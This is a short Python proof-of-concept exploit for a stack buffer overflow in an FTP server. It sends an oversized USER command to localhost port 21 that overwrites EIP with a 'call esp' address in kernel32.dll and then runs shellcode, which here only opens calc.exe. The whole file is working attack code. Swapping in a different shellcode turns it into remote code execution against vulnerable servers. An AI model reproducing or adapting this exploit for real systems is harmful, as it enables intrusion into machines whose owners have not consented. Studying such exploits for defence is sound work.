#!/usr/bin/python
import socket
from struct import pack

#   Junk  |  EIP   |  ESP
#   230b  |   12b  |  758b
#		   JMP ESP   Shell code

BUFF_SIZE = 230+12+758

def doRecv(sock):
	print s.recv(1024)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',21))
doRecv(s)


buff = 'A'*230 #Padding
buff +=  pack('<L',0x7c8369c0)#EIP
		#0x7c8369c0 : call esp |  {PAGE_EXECUTE_READ} [kernel32.dll] 

#Calc.exe shellcode
buff += "\x31\xC9"              
buff += "\x51"                  
buff += "\x68\x63\x61\x6C\x63"  
buff += "\x54"                  
buff += "\xB8\xC7\x93\xC2\x77"  
buff += "\xFF\xD0"    

padding = "C"*(BUFF_SIZE-len(buff))
buff += padding

s.send("USER %s \r\n" % (buff))
doRecv(s)
s.send("PASS anonymous \r\n")
doRecv(s)
